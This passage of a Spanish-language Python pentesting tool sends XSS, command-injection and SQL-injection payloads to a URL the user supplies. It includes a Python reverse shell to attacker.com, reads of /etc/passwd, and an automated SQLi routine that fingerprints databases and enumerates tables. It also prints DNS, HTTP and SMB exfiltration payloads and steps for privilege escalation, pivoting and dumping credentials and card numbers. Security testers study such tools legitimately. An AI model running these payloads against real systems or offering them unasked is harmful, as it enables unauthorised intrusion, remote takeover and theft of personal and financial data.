        "<div onmouseover=alert('XSS')>Hover</div>",
        "<a href=javascript:alert('XSS')>Click</a>",
        "<form><button formaction=javascript:alert('XSS')>Submit</button></form>",
        
        # Advanced bypass
        "<script>prompt`XSS`</script>",
        "<script>confirm`XSS`</script>",
        "<script>console.log('XSS')</script>",
        
        # DOM XSS
        "#<script>alert('XSS')</script>",
        "?test=<script>alert('XSS')</script>",
        
        # Polyglot XSS
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/`/+/[*/[]/+alert(1)//'>",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(payloads_xss)} payloads XSS...{Colors.END}")
    
    vulnerables = []
    
    for i, payload in enumerate(payloads_xss, 1):
        try:
            url = f"{objetivo.rstrip('/')}{endpoint}{quote(payload)}"
            respuesta = requests.get(url, verify=False, timeout=5)
            
            # Buscar el payload en la respuesta (reflected XSS)
            if payload.replace('<', '&lt;') in respuesta.text or \
               payload in respuesta.text or \
               'alert(' in respuesta.text.lower() or \
               'onerror' in respuesta.text.lower() or \
               'onload' in respuesta.text.lower():
                
                vulnerables.append(payload)
                print(f"  {Colors.GREEN}✓{Colors.END} Payload {i}: POSIBLE XSS REFLEJADO")
                print(f"     Payload: {payload[:50]}...")
                
                # Verificar si está sanitizado
                if '<script>' in respuesta.text:
                    print(f"     {Colors.RED}⚠ SCRIPT TAG NO SANITIZADO{Colors.END}")
            
            # También probar POST
            respuesta_post = requests.post(objetivo.rstrip('/') + endpoint.split('?')[0], 
                                         data={'q': payload}, 
                                         verify=False, timeout=5)
            
            if payload in respuesta_post.text:
                print(f"  {Colors.GREEN}✓{Colors.END} Payload {i}: POSIBLE XSS VIA POST")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Payload {i}: Error - {str(e)[:30]}")
    
    if vulnerables:
        print(f"\n{Colors.GREEN}[+] ¡VULNERABILIDAD XSS ENCONTRADA!{Colors.END}")
        print(f"  {len(vulnerables)} payloads funcionaron")
        
        print(f"\n{Colors.YELLOW}[!] Siguiente paso para el pentester:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} Verificar el contexto de inyección:")
        print(f"     - Entre etiquetas HTML")
        print(f"     - Dentro de atributos")
        print(f"     - En JavaScript")
        print(f"  {Colors.CYAN}2.{Colors.END} Probar payloads específicos para el contexto")
        print(f"  {Colors.CYAN}3.{Colors.END} Verificar si hay Content Security Policy (CSP)")
        print(f"  {Colors.CYAN}4.{Colors.END} Documentar y crear PoC")
        print(f"  {Colors.CYAN}5.{Colors.END} Probar Stored XSS si es posible")
    else:
        print(f"\n{Colors.RED}[-] No se detectó XSS reflejado{Colors.END}")
        print(f"{Colors.YELLOW}[!] Considerar probar:{Colors.END}")
        print(f"  {Colors.CYAN}•{Colors.END} Stored XSS")
        print(f"  {Colors.CYAN}•{Colors.END} DOM-based XSS")
        print(f"  {Colors.CYAN}•{Colors.END} Blind XSS")

def command_injection(objetivo):
    """Pruebas de Command Injection"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Ejecutando pruebas de Command Injection...{Colors.END}")
    
    print(f"{Colors.YELLOW}[!] Se necesita un endpoint que ejecute comandos del sistema{Colors.END}")
    
    endpoint = input(f"{Colors.CYAN}[?] Endpoint a probar (ej: /ping?ip=): {Colors.END}").strip()
    if not endpoint.startswith('/'):
        endpoint = '/' + endpoint
    
    # Payloads de command injection
    payloads = [
        # Unix/Linux
        "; whoami",
        "| whoami",
        "|| whoami",
        "&& whoami",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        "; ls -la",
        "; cat /etc/passwd",
        "; uname -a",
        "; ping -c 1 127.0.0.1",
        
        # Windows
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "%0a whoami",
        "`whoami`",
        "$(whoami)",
        "| dir",
        "& dir",
        "; dir",
        
        # Blind command injection
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        
        # Advanced
        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        # Bypass filters
        "w'h'o'a'm'i",
        "w$@hoami",
        "who$@ami",
        "whoam\\i",
        "who`echo am`i",
        "whoa$()mi",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(payloads)} payloads de Command Injection...{Colors.END}")
    
    vulnerables = []
    
    for i, payload in enumerate(payloads, 1):
        try:
            url = f"{objetivo.rstrip('/')}{endpoint}{quote(payload)}"
            
            # Medir tiempo para blind injection
            start_time = time.time()
            respuesta = requests.get(url, verify=False, timeout=10)
            elapsed = time.time() - start_time
            
            contenido = respuesta.text.lower()
            
            # Indicadores de command injection exitoso
            indicadores = [
                'root', 'uid=', 'gid=', 'groups=', 'bin/', 'sbin/',
                'etc/passwd', 'daemon:', 'nobody:', 'linux', 'unix',
                'microsoft', 'windows', 'volume', 'directory'
            ]
            
            injection_detectada = False
            
            # Verificar output de comandos
            for indicador in indicadores:
                if indicador in contenido:
                    injection_detectada = True
                    break
            
            # Verificar tiempo de respuesta para blind injection
            if 'sleep' in payload and elapsed > 4:
                injection_detectada = True
            
            if injection_detectada:
                vulnerables.append(payload)
                print(f"  {Colors.GREEN}✓{Colors.END} Payload {i}: POSIBLE COMMAND INJECTION")
                print(f"     Payload: {payload}")
                print(f"     Tiempo: {elapsed:.2f}s, Status: {respuesta.status_code}")
                
                # Mostrar snippet de respuesta
                lines = contenido.split('\n')
                for line in lines[:5]:
                    if any(ind in line for ind in indicadores):
                        print(f"     Output: {line[:100]}...")
            
            else:
                print(f"  {Colors.RED}✗{Colors.END} Payload {i}: No parece vulnerable")
                
        except requests.exceptions.Timeout:
            print(f"  {Colors.YELLOW}?{Colors.END} Payload {i}: Timeout - posible blind injection")
            vulnerables.append(payload)
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Payload {i}: Error - {str(e)[:30]}")
    
    if vulnerables:
        print(f"\n{Colors.GREEN}[+] ¡COMMAND INJECTION DETECTADA!{Colors.END}")
        print(f"  {len(vulnerables)} payloads funcionaron")
        
        print(f"\n{Colors.YELLOW}[!] Siguiente paso CRÍTICO:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} CONFIRMAR vulnerabilidad:")
        print(f"     - Probar comandos como 'id', 'whoami', 'pwd'")
        print(f"  {Colors.CYAN}2.{Colors.END} ESCALAR privilegios:")
        print(f"     - Verificar usuario actual")
        print(f"     - Buscar archivos SUID")
        print(f"     - Verificar sudo permissions")
        print(f"  {Colors.CYAN}3.{Colors.END} OBTENER shell reversa:")
        print(f"     - Usar netcat, bash, python, perl, etc.")
        print(f"  {Colors.CYAN}4.{Colors.END} POST-EXPLOTACIÓN:")
        print(f"     - Dump de bases de datos")
        print(f"     - Buscar credenciales")
        print(f"     - Pivotear a otros sistemas")
        print(f"  {Colors.CYAN}5.{Colors.END} DOCUMENTAR inmediatamente")
        print(f"  {Colors.CYAN}6.{Colors.END} NOTIFICAR al equipo de seguridad")
    else:
        print(f"\n{Colors.RED}[-] No se detectó Command Injection{Colors.END}")

# ============================
# MÓDULO 4: SQL INJECTION
# ============================

def menu_sql_injection_completo(objetivo):
    """Menú completo de SQL Injection"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔══════ SQL INJECTION COMPLETO ═══════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Error-Based SQLi Avanzado        {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Union-Based SQLi Avanzado        {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Boolean-Based Blind SQLi         {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Time-Based Blind SQLi            {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Out-of-Band SQLi                 {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Second-Order SQLi                {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} NoSQL Injection                  {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Database Fingerprinting          {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}9.{Colors.END} Data Exfiltration                {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}10.{Colors.END} SQLi Automatizado (Peligroso)   {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal         {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚═════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                error_based_sqli_avanzado(objetivo)
            elif opcion == 2:
                union_based_sqli_avanzado(objetivo)
            elif opcion == 3:
                boolean_based_blind_sqli(objetivo)
            elif opcion == 4:
                time_based_blind_sqli(objetivo)
            elif opcion == 5:
                out_of_band_sqli(objetivo)
            elif opcion == 6:
                second_order_sqli(objetivo)
            elif opcion == 7:
                nosql_injection(objetivo)
            elif opcion == 8:
                database_fingerprinting(objetivo)
            elif opcion == 9:
                data_exfiltration(objetivo)
            elif opcion == 10:
                sqli_automatizado_peligroso(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def sqli_automatizado_peligroso(objetivo):
    """SQL Injection automatizado y peligroso"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.RED}[!] ¡ADVERTENCIA! ESTA FUNCIÓN ES ALTAMENTE INTRUSIVA{Colors.END}")
    print(f"{Colors.RED}[!] Puede causar daños en la base de datos{Colors.END}")
    
    confirmacion = input(f"\n{Colors.YELLOW}[?] ¿Estás ABSOLUTAMENTE seguro? (escribe 'CONFIRMAR'): {Colors.END}")
    if confirmacion != 'CONFIRMAR':
        print(f"{Colors.RED}[!] Operación cancelada{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}[*] Iniciando SQL Injection automatizado avanzado...{Colors.END}")
    
    # Obtener información del endpoint
    endpoint = input(f"{Colors.CYAN}[?] Endpoint vulnerable (con parámetro): {Colors.END}").strip()
    parametro = input(f"{Colors.CYAN}[?] Nombre del parámetro vulnerable: {Colors.END}").strip()
    valor = input(f"{Colors.CYAN}[?] Valor normal del parámetro: {Colors.END}").strip()
    
    print(f"\n{Colors.CYAN}[+] Fase 1: Fingerprinting de base de datos{Colors.END}")
    
    # Payloads para identificar DBMS
    fingerprint_payloads = [
        (f"{valor}' AND '1'='1", "Generic true"),
        (f"{valor}' AND '1'='2", "Generic false"),
        (f"{valor}' AND 1=1--", "MySQL/PostgreSQL comment"),
        (f"{valor}' AND 1=1#", "MySQL comment"),
        (f"{valor}' AND 1=1/*", "Oracle comment"),
        (f"{valor}' WAITFOR DELAY '00:00:05'--", "MSSQL time-based"),
        (f"{valor}' AND SLEEP(5)--", "MySQL time-based"),
        (f"{valor}' AND pg_sleep(5)--", "PostgreSQL time-based"),
        (f"{valor}' AND 1=CAST((SELECT version())AS INT)--", "Error-based version"),
    ]
    
    db_type = None
    
    for payload, desc in fingerprint_payloads:
        try:
            url = f"{objetivo.rstrip('/')}{endpoint}?{parametro}={quote(payload)}"
            start = time.time()
            respuesta = requests.get(url, verify=False, timeout=10)
            elapsed = time.time() - start
            
            contenido = respuesta.text.lower()
            
            # Buscar errores específicos
            if 'mysql' in contenido:
                db_type = 'MySQL'
                break
            elif 'postgresql' in contenido or 'postgres' in contenido:
                db_type = 'PostgreSQL'
                break
            elif 'ora-' in contenido or 'oracle' in contenido:
                db_type = 'Oracle'
                break
            elif 'sql server' in contenido or 'microsoft' in contenido:
                db_type = 'MSSQL'
                break
            elif 'syntax error' in contenido:
                print(f"  {Colors.YELLOW}[?] Error de sintaxis detectado{Colors.END}")
            
            # Verificar time-based
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                if elapsed > 4:
                    if 'sleep' in payload.lower():
                        db_type = 'MySQL'
                    elif 'waitfor' in payload.lower():
                        db_type = 'MSSQL'
                    break
        
        except Exception as e:
            print(f"  {Colors.RED}[!] Error: {str(e)[:50]}{Colors.END}")
    
    if db_type:
        print(f"  {Colors.GREEN}✓{Colors.END} Base de datos identificada: {db_type}")
    else:
        print(f"  {Colors.YELLOW}[?] No se pudo identificar la base de datos{Colors.END}")
        db_type = input(f"{Colors.CYAN}[?] ¿Qué DBMS crees que es? (mysql/postgres/mssql/oracle): {Colors.END}")
    
    print(f"\n{Colors.CYAN}[+] Fase 2: Enumeración de información{Colors.END}")
    
    # Payloads según el tipo de DBMS
    if db_type.lower() == 'mysql':
        payloads = [
            (f"{valor}' UNION SELECT NULL,version(),NULL--", "Versión de MySQL"),
            (f"{valor}' UNION SELECT NULL,database(),NULL--", "Base de datos actual"),
            (f"{valor}' UNION SELECT NULL,user(),NULL--", "Usuario actual"),
            (f"{valor}' UNION SELECT NULL,@@hostname,NULL--", "Hostname"),
        ]
    elif db_type.lower() == 'postgresql':
        payloads = [
            (f"{valor}' UNION SELECT NULL,version(),NULL--", "Versión de PostgreSQL"),
            (f"{valor}' UNION SELECT NULL,current_database(),NULL--", "Base de datos actual"),
            (f"{valor}' UNION SELECT NULL,current_user,NULL--", "Usuario actual"),
        ]
    elif db_type.lower() == 'mssql':
        payloads = [
            (f"{valor}' UNION SELECT NULL,@@version,NULL--", "Versión de MSSQL"),
            (f"{valor}' UNION SELECT NULL,DB_NAME(),NULL--", "Base de datos actual"),
            (f"{valor}' UNION SELECT NULL,SUSER_NAME(),NULL--", "Usuario actual"),
        ]
    else:
        payloads = []
    
    for payload, desc in payloads:
        try:
            url = f"{objetivo.rstrip('/')}{endpoint}?{parametro}={quote(payload)}"
            respuesta = requests.get(url, verify=False, timeout=10)
            
            # Extraer información de la respuesta
            lines = respuesta.text.split('\n')
            for line in lines:
                if any(x in line.lower() for x in ['version', 'database', 'user', 'hostname', '@@']):
                    print(f"  {Colors.GREEN}✓{Colors.END} {desc}: {line.strip()[:100]}")
                    break
        
        except Exception as e:
            print(f"  {Colors.RED}[!] Error en {desc}: {str(e)[:50]}{Colors.END}")
    
    print(f"\n{Colors.CYAN}[+] Fase 3: Enumeración de tablas{Colors.END}")
    
    if db_type.lower() == 'mysql':
        table_payload = f"{valor}' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--"
    elif db_type.lower() == 'postgresql':
        table_payload = f"{valor}' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--"
    elif db_type.lower() == 'mssql':
        table_payload = f"{valor}' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
    
    try:
        url = f"{objetivo.rstrip('/')}{endpoint}?{parametro}={quote(table_payload)}"
        respuesta = requests.get(url, verify=False, timeout=10)
        
        # Buscar nombres de tablas en la respuesta
        table_patterns = ['users', 'admin', 'customer', 'product', 'order', 'payment', 'credit', 'account']
        
        for pattern in table_patterns:
            if pattern in respuesta.text.lower():
                print(f"  {Colors.GREEN}✓{Colors.END} Posible tabla encontrada: {pattern}")
        
        print(f"  {Colors.YELLOW}[?] Respuesta completa guardada en archivo{Colors.END}")
        
        # Guardar respuesta para análisis manual
        with open(f'sqli_response_{int(time.time())}.html', 'w') as f:
            f.write(respuesta.text)
    
    except Exception as e:
        print(f"  {Colors.RED}[!] Error enumerando tablas: {str(e)[:50]}{Colors.END}")
    
    print(f"\n{Colors.GREEN}[+] SQL Injection automatizado completado{Colors.END}")
    
    print(f"\n{Colors.YELLOW}[!] Siguiente paso CRÍTICO:{Colors.END}")
    print(f"  {Colors.CYAN}1.{Colors.END} CONTINUAR con explotación manual:")
    print(f"     - Usar sqlmap para explotación completa")
    print(f"     - Extraer todas las tablas y columnas")
    print(f"     - Dump de datos sensibles")
    print(f"  {Colors.CYAN}2.{Colors.END} ESCALAR a RCE si es posible:")
    print(f"     - MySQL: INTO OUTFILE")
    print(f"     - PostgreSQL: COPY TO / LOAD")
    print(f"     - MSSQL: xp_cmdshell")
    print(f"  {Colors.CYAN}3.{Colors.END} NOTIFICAR inmediatamente al equipo de seguridad")
    print(f"  {Colors.CYAN}4.{Colors.END} DOCUMENTAR todo el proceso")


# ============================
# FUNCIONES PARA MENÚ DE SQL INJECTION COMPLETO
# ============================

def error_based_sqli_avanzado(objetivo):
    """Error-Based SQL Injection avanzado"""
    print(f"\n{Colors.GREEN}[*] Error-Based SQL Injection avanzado...{Colors.END}")
    
    # Esta función ya debería existir como error_based_sqli
    # Podemos mejorarla o simplemente llamar a la existente
    
    print(f"{Colors.CYAN}[+] Esta función es similar a 'Error-Based SQLi' básico{Colors.END}")
    print(f"{Colors.CYAN}[+] Usando función básica...{Colors.END}")
    
    # Llamar a la función básica si existe, sino mostrar mensaje
    try:
        error_based_sqli(objetivo)
    except:
        print(f"{Colors.RED}[!] Función básica no disponible{Colors.END}")
        print(f"{Colors.YELLOW}[+] Payloads avanzados Error-Based:{Colors.END}")
        print(f"  • ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--")
        print(f"  • ' AND EXTRACTVALUE(rand(),CONCAT(0x3a,@@version))--")
        print(f"  • ' AND 1=CONVERT(int,@@version)--")

def union_based_sqli_avanzado(objetivo):
    """Union-Based SQL Injection avanzado"""
    print(f"\n{Colors.GREEN}[*] Union-Based SQL Injection avanzado...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Técnicas Union-Based avanzadas:{Colors.END}")
    
    tecnicas = [
        ("Determinar número de columnas", "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--"),
        ("Encontrar columnas útiles", "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--"),
        ("Extraer datos", "' UNION SELECT version(),user(),database()--"),
        ("Extraer tablas", "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"),
        ("Extraer columnas", "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"),
        ("Extraer datos sensibles", "' UNION SELECT username,password,NULL FROM users--"),
    ]
    
    for nombre, *payloads in tecnicas:
        print(f"\n{Colors.YELLOW}[+] {nombre}:{Colors.END}")
        for payload in payloads:
            print(f"  • {payload}")
    
    print(f"\n{Colors.CYAN}[+] Ejemplo completo:{Colors.END}")
    print(f"  1. ' ORDER BY 10-- (encontrar error en ORDER BY 6, 5 columnas)")
    print(f"  2. ' UNION SELECT 1,2,3,4,5-- (ver qué columnas se muestran)")
    print(f"  3. ' UNION SELECT @@version,user(),database(),@@hostname,5--")
    print(f"  4. ' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables--")

def boolean_based_blind_sqli(objetivo):
    """Boolean-Based Blind SQL Injection"""
    print(f"\n{Colors.GREEN}[*] Boolean-Based Blind SQL Injection...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Características:{Colors.END}")
    print(f"  • No hay mensajes de error visibles")
    print(f"  • Se basa en diferencias en respuestas TRUE/FALSE")
    print(f"  • Más lento pero más sigiloso")
    
    print(f"\n{Colors.YELLOW}[+] Payloads Boolean-Based:{Colors.END}")
    
    payloads = [
        ("Verificar vulnerabilidad", "' AND '1'='1", "' AND '1'='2"),
        ("Extraer primer carácter de DB", "' AND SUBSTRING(database(),1,1)='a'--"),
        ("Extraer longitud de DB", "' AND LENGTH(database())=1--"),
        ("Verificar usuario", "' AND SUBSTRING(user(),1,1)='r'--"),
        ("Ciegamente extraer datos", "' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--"),
    ]
    
    for desc, true_payload, *false_payload in payloads:
        print(f"\n{Colors.CYAN}[+] {desc}:{Colors.END}")
        print(f"  TRUE: {true_payload}")
        if false_payload:
            print(f"  FALSE: {false_payload[0]}")
    
    print(f"\n{Colors.YELLOW}[+] Automatización recomendada:{Colors.END}")
    print(f"  • SQLmap: sqlmap -u 'url' --technique=B --level=3")
    print(f"  • Burp Suite Intruder")
    print(f"  • Scripts personalizados en Python")

def time_based_blind_sqli(objetivo):
    """Time-Based Blind SQL Injection"""
    print(f"\n{Colors.GREEN}[*] Time-Based Blind SQL Injection...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Características:{Colors.END}")
    print(f"  • Usa delays para extraer información")
    print(f"  • Útil cuando no hay diferencias visibles")
    print(f"  • Muy lento pero efectivo")
    
    print(f"\n{Colors.YELLOW}[+] Payloads Time-Based por DBMS:{Colors.END}")
    
    dbms_payloads = {
        "MySQL": [
            "' AND SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
        "PostgreSQL": [
            "' AND pg_sleep(5)--",
            "' AND (SELECT pg_sleep(5) FROM users WHERE username='admin')--",
            "' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ],
        "MSSQL": [
            "' WAITFOR DELAY '00:00:05'--",
            "' AND IF 1=1 WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05'--",
        ],
        "Oracle": [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
            "' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5))>0--",
        ],
    }
    
    for dbms, payloads in dbms_payloads.items():
        print(f"\n{Colors.CYAN}[+] {dbms}:{Colors.END}")
        for payload in payloads:
            print(f"  • {payload}")
    
    print(f"\n{Colors.YELLOW}[+] Técnica de prueba:{Colors.END}")
    print(f"  1. Enviar payload con SLEEP(10)")
    print(f"  2. Medir tiempo de respuesta")
    print(f"  3. Si tarda ~10 segundos, es vulnerable")
    print(f"  4. Automatizar con scripts")

def out_of_band_sqli(objetivo):
    """Out-of-Band SQL Injection"""
    print(f"\n{Colors.GREEN}[*] Out-of-Band SQL Injection...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Características:{Colors.END}")
    print(f"  • Usa DNS/HTTP requests para exfiltrar datos")
    print(f"  • Útil cuando la aplicación no muestra resultados")
    print(f"  • Requiere permisos especiales en DB")
    
    print(f"\n{Colors.YELLOW}[+] Técnicas OOB:{Colors.END}")
    
    tecnicas = [
        ("DNS Exfiltration (MySQL)", "' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt'))--"),
        ("DNS Exfiltration (MSSQL)", "; EXEC master..xp_dirtree '\\\\attacker.com\\test'--"),
        ("HTTP Exfiltration", "' UNION SELECT 1,2,LOAD_FILE(CONCAT('http://attacker.com/',@@version))--"),
        ("SMB Relay", "' AND (SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com,1433';'sa';'password','SELECT @@version'))--"),
    ]
    
    for nombre, payload in tecnicas:
        print(f"\n{Colors.CYAN}[+] {nombre}:{Colors.END}")
        print(f"  • {payload}")
    
    print(f"\n{Colors.YELLOW}[+] Requisitos:{Colors.END}")
    print(f"  • Servidor DNS/HTTP controlado por atacante")
    print(f"  • DB con permisos FILE o xp_cmdshell")
    print(f"  • Salida de red desde DB server")

def second_order_sqli(objetivo):
    """Second-Order SQL Injection"""
    print(f"\n{Colors.GREEN}[*] Second-Order SQL Injection...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Características:{Colors.END}")
    print(f"  • Input se almacena y ejecuta después")
    print(f"  • Más difícil de detectar")
    print(f"  • Requiere análisis de flujo de datos")
    
    print(f"\n{Colors.YELLOW}[+] Escenarios comunes:{Colors.END}")
    
    escenarios = [
        ("Registro de usuario", "Usuario: admin'--", "Luego cambia contraseña: UPDATE users SET password='hacked' WHERE username='admin'--'"),
        ("Comentarios/Posts", "Comentario: ' OR 1=1--", "Luego búsqueda: SELECT * FROM comments WHERE text LIKE '%' OR 1=1--%'"),
        ("Perfil de usuario", "Nombre: '; DROP TABLE users--", "Luego editar perfil ejecuta el payload"),
    ]
    
    for nombre, input_ej, ejecucion_ej in escenarios:
        print(f"\n{Colors.CYAN}[+] {nombre}:{Colors.END}")
        print(f"  Input: {input_ej}")
        print(f"  Ejecución posterior: {ejecucion_ej}")
    
    print(f"\n{Colors.YELLOW}[+] Técnicas de testing:{Colors.END}")
    print(f"  1. Buscar donde se almacenan datos de usuario")
    print(f"  2. Probar payloads que se activen después")
    print(f"  3. Verificar flujos de datos completos")
    print(f"  4. Usar time-based para confirmación")

def nosql_injection(objetivo):
    """NoSQL Injection"""
    print(f"\n{Colors.GREEN}[*] NoSQL Injection...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Bases de datos NoSQL comunes:{Colors.END}")
    print(f"  • MongoDB")
    print(f"  • CouchDB")
    print(f"  • Cassandra")
    print(f"  • Redis")
    
    print(f"\n{Colors.YELLOW}[+] Payloads MongoDB:{Colors.END}")
    
    payloads_mongo = [
        ("Bypass login", '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}'),
        ("Extraer datos", '{"$where": "this.username == \'admin\' && this.password.length > 0"}'),
        ("JavaScript injection", '{"$where": "function(){return true;}"}'),
        ("Operadores de comparación", '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}'),
    ]
    
    for desc, *payloads in payloads_mongo:
        print(f"\n{Colors.CYAN}[+] {desc}:{Colors.END}")
        for payload in payloads:
            print(f"  • {payload}")
    
    print(f"\n{Colors.YELLOW}[+] Payloads Redis:{Colors.END}")
    print(f"  • EVAL 'redis.call(\"set\",\"hacked\",\"true\")' 0")
    print(f"  • CONFIG SET dir /tmp")
    print(f"  • SAVE (para guardar cambios)")
    
    print(f"\n{Colors.YELLOW}[+] Testing:{Colors.END}")
    print(f"  1. Cambiar Content-Type a application/json")
    print(f"  2. Probar operadores $ne, $gt, $regex, $where")
    print(f"  3. Buscar inyección de JavaScript")

def database_fingerprinting(objetivo):
    """Database Fingerprinting"""
    print(f"\n{Colors.GREEN}[*] Database Fingerprinting...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Técnicas de identificación:{Colors.END}")
    
    tecnicas = [
        ("Comentarios", "-- MySQL", "# MySQL", "/* */ Todos", "-- Oracle"),
        ("Funciones de cadena", "CONCAT() MySQL", "|| Oracle", "+ MSSQL"),
        ("Funciones de tiempo", "SLEEP() MySQL", "pg_sleep() PostgreSQL", "WAITFOR DELAY MSSQL"),
        ("Variables", "@@version MySQL", "version() PostgreSQL", "@@version MSSQL"),
        ("Tablas sistema", "information_schema MySQL", "pg_catalog PostgreSQL", "sys.tables MSSQL"),
    ]
    
    for nombre, *ejemplos in tecnicas:
        print(f"\n{Colors.YELLOW}[+] {nombre}:{Colors.END}")
        for ejemplo in ejemplos:
            print(f"  • {ejemplo}")
    
    print(f"\n{Colors.CYAN}[+] Payloads de fingerprinting:{Colors.END}")
    
    payloads = [
        ("MySQL", "' AND @@version LIKE '%MySQL%'--"),
        ("PostgreSQL", "' AND version() LIKE '%PostgreSQL%'--"),
        ("MSSQL", "' AND @@version LIKE '%Microsoft%'--"),
        ("Oracle", "' AND (SELECT banner FROM v$version) LIKE '%Oracle%'--"),
        ("SQLite", "' AND sqlite_version() LIKE '%'--"),
    ]
    
    for dbms, payload in payloads:
        print(f"  {dbms}: {payload}")
    
    print(f"\n{Colors.YELLOW}[+] Automatización:{Colors.END}")
    print(f"  • SQLmap: sqlmap -u 'url' --banner")
    print(f"  • Manual: probar diferentes sintaxis")
    print(f"  • Observar mensajes de error")

def data_exfiltration(objetivo):
    """Data Exfiltration via SQL Injection"""
    print(f"\n{Colors.GREEN}[*] Data Exfiltration via SQL Injection...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Técnicas de exfiltración:{Colors.END}")
    
    tecnicas = [
        ("Union-based", "Extraer datos directamente con UNION"),
        ("Error-based", "Forzar errores que contengan datos"),
        ("Blind", "Extraer bit por bit con boolean/time"),
        ("OOB", "Exfiltrar via DNS/HTTP requests"),
        ("File write", "Escribir datos en archivos accesibles"),
    ]
    
    for nombre in tecnicas:
        print(f"  • {nombre[0]}")
    
    print(f"\n{Colors.YELLOW}[+] Ejemplos de exfiltración:{Colors.END}")
    
    ejemplos = [
        ("Usuarios/contraseñas", "' UNION SELECT username,password FROM users--"),
        ("Hash dumping", "' UNION SELECT username,password_hash FROM users--"),
        ("Credit cards", "' UNION SELECT card_number,exp_date FROM payments--"),
        ("Emails", "' UNION SELECT email,phone FROM customers--"),
